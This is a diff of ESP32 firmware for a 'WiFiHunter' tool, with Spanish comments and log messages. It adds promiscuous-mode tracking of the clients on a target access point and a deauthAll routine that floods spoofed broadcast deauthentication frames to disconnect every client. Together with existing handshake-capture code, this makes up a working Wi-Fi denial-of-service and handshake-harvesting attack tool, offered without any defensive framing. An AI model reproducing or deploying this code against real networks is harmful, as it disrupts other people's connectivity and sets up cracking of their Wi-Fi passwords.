@@ -42,49 +42,33 @@ void WiFiHunter::getScanResults(RedInfo* resultados, int maxRedes, int& encontra
     Serial.printf("%d redes encontradas\n", encontradas);
 }
 
-void WiFiHunter::scanClients(const uint8_t* bssid, int canal, ClienteInfo* clientes, int maxClientes, int& encontrados) {
-    encontrados = 0;
+void WiFiHunter::startClientScan(const uint8_t* bssid, int canal) {
     if (!bssid) return;
-    
-    // Vaciar buffer de paquetes
-    packetHead = 0;
-    packetTail = 0;
-    
+    memcpy(bssidObjetivo, bssid, 6);
+    numClientes = 0;
+    escaneandoClientes = true;
     esp_wifi_set_channel(canal, WIFI_SECOND_CHAN_NONE);
-    
-    // Capturar paquetes durante 3 segundos
-    unsigned long start = millis();
-    while (millis() - start < 3000) {
-        processPackets();  // Procesa paquetes en el buffer
-        delay(10);
-    }
-    
-    // Ahora extraemos clientes del buffer procesado
-    // Nota: esto es simplificado, asumimos que processPackets llena una lista
-    // Para una implementación real, necesitarías una tabla de clientes
-    // que se actualice en cada paquete.
-    
-    // Como demostración, voy a buscar en el buffer pares MAC origen/destino
-    // que tengan como BSSID el objetivo.
-    
-    // Esta parte requiere más lógica, te la doy en la siguiente actualización
-    // Por ahora dejamos un placeholder
-    Serial.println("Escaneo de clientes activo");
+    Serial.println("Escaneo de clientes iniciado");
 }
 
-void WiFiHunter::processPackets() {
-    // Extrae direcciones MAC de los paquetes capturados
-    // Por ahora solo vaciamos el buffer para no saturarlo
-    while (packetTail != packetHead) {
-        // Aquí analizarías cada paquete y extraerías clientes
-        // Por simplicidad, solo avanzamos el puntero
-        packetTail = (packetTail + 1) % BUFFER_PAQUETES;
+void WiFiHunter::stopClientScan() {
+    escaneandoClientes = false;
+    Serial.println("Escaneo de clientes detenido");
+}
+
+bool WiFiHunter::isClientScanActive() {
+    return escaneandoClientes;
+}
+
+void WiFiHunter::getClients(ClienteInfo* clientesOut, int maxClientes, int& encontrados) {
+    encontrados = (numClientes < maxClientes) ? numClientes : maxClientes;
+    for (int i = 0; i < encontrados; i++) {
+        memcpy(&clientesOut[i], &clientes[i], sizeof(ClienteInfo));
     }
 }
 
 void WiFiHunter::deauth(const RedInfo& red, const uint8_t* clienteMac, int numPaquetes) {
     Serial.printf("Atacando red: %s (canal %d)\n", red.ssid, red.canal);
-    
     esp_wifi_set_channel(red.canal, WIFI_SECOND_CHAN_NONE);
     delay(50);
     
@@ -102,25 +86,35 @@ void WiFiHunter::deauth(const RedInfo& red, const uint8_t* clienteMac, int numPa
             delay(10);
         }
     }
-    
     Serial.printf("%d paquetes de deauth enviados\n", numPaquetes + (clienteMac ? 5 : 0));
+}
+
+void WiFiHunter::deauthAll(const RedInfo& red, int numPaquetes) {
+    Serial.printf("Atacando TODOS los clientes de: %s\n", red.ssid);
+    esp_wifi_set_channel(red.canal, WIFI_SECOND_CHAN_NONE);
+    delay(50);
+    
+    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    
+    for (int i = 0; i < numPaquetes; i++) {
+        sendDeauthFrame(red.bssid, broadcast, red.canal);
+        delay(3);
+    }
+    Serial.printf("%d paquetes de deauth broadcast enviados\n", numPaquetes);
 }
 
 void WiFiHunter::sendDeauthFrame(const uint8_t* bssid, const uint8_t* clienteMac, int channel) {
     uint8_t deauthFrame[26];
-    
     deauthFrame[0] = 0xC0;
     deauthFrame[1] = 0x00;
     deauthFrame[2] = 0x3A;
     deauthFrame[3] = 0x01;
-    
     memcpy(&deauthFrame[4], clienteMac, 6);
     
     uint8_t nuestraMac[6];
     esp_wifi_get_mac(WIFI_IF_STA, nuestraMac);
     memcpy(&deauthFrame[10], nuestraMac, 6);
     memcpy(&deauthFrame[16], bssid, 6);
-    
     deauthFrame[24] = 0x07;
     deauthFrame[25] = 0x00;
     
@@ -134,30 +128,17 @@ void WiFiHunter::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type
     wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
     uint8_t *frame = pkt->payload;
     uint16_t len = pkt->rx_ctrl.sig_len;
+    int rssi = pkt->rx_ctrl.rssi;
+    int canal = pkt->rx_ctrl.channel;
+    
+    if (len < 24) return;
+    
+    if (instance) {
+        instance->procesarPaquete(frame, len, rssi, canal);
+    }
     
     if (len < 100) return;
     
-    // Guardar paquete en buffer para procesar clientes
-    if (instance) {
-        int next = (instance->packetHead + 1) % BUFFER_PAQUETES;
-        if (next != instance->packetTail) {
-            PaqueteCapturado* p = &instance->packetBuffer[instance->packetHead];
-            
-            // Extraer direcciones MAC del frame 802.11
-            // Offset 4-9: destino, 10-15: origen, 16-21: BSSID (para frames de datos)
-            if (len > 24) {
-                memcpy(p->macDestino, &frame[4], 6);
-                memcpy(p->macOrigen, &frame[10], 6);
-                memcpy(p->bssid, &frame[16], 6);
-                p->rssi = pkt->rx_ctrl.rssi;
-                p->canal = pkt->rx_ctrl.channel;
-                p->timestamp = millis();
-                instance->packetHead = next;
-            }
-        }
-    }
-    
-    // Detección de handshake (código existente)
     int offset = 24;
     bool encontrado = false;
     
@@ -199,6 +180,45 @@ void WiFiHunter::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type
                 }
             }
         }
+    }
+}
+
+void WiFiHunter::procesarPaquete(const uint8_t* frame, uint16_t len, int rssi, int canal) {
+    if (!escaneandoClientes) return;
+    
+    uint8_t macOrigen[6];
+    uint8_t macDestino[6];
+    memcpy(macOrigen, &frame[10], 6);
+    memcpy(macDestino, &frame[4], 6);
+    
+    if (memcmp(macDestino, bssidObjetivo, 6) == 0) {
+        actualizarCliente(macOrigen, bssidObjetivo, rssi, canal);
+    }
+    
+    if (memcmp(macOrigen, bssidObjetivo, 6) == 0) {
+        actualizarCliente(macDestino, bssidObjetivo, rssi, canal);
+    }
+}
+
+void WiFiHunter::actualizarCliente(const uint8_t* mac, const uint8_t* bssid, int rssi, int canal) {
+    if (mac[0] == 0xFF && mac[1] == 0xFF && mac[2] == 0xFF &&
+        mac[3] == 0xFF && mac[4] == 0xFF && mac[5] == 0xFF) return;
+    
+    for (int i = 0; i < numClientes; i++) {
+        if (memcmp(clientes[i].mac, mac, 6) == 0) {
+            clientes[i].rssi = rssi;
+            clientes[i].lastSeen = millis();
+            return;
+        }
+    }
+    
+    if (numClientes < MAX_CLIENTES) {
+        memcpy(clientes[numClientes].mac, mac, 6);
+        memcpy(clientes[numClientes].bssid, bssid, 6);
+        clientes[numClientes].rssi = rssi;
+        clientes[numClientes].canal = canal;
+        clientes[numClientes].lastSeen = millis();
+        numClientes++;
     }
 }
 
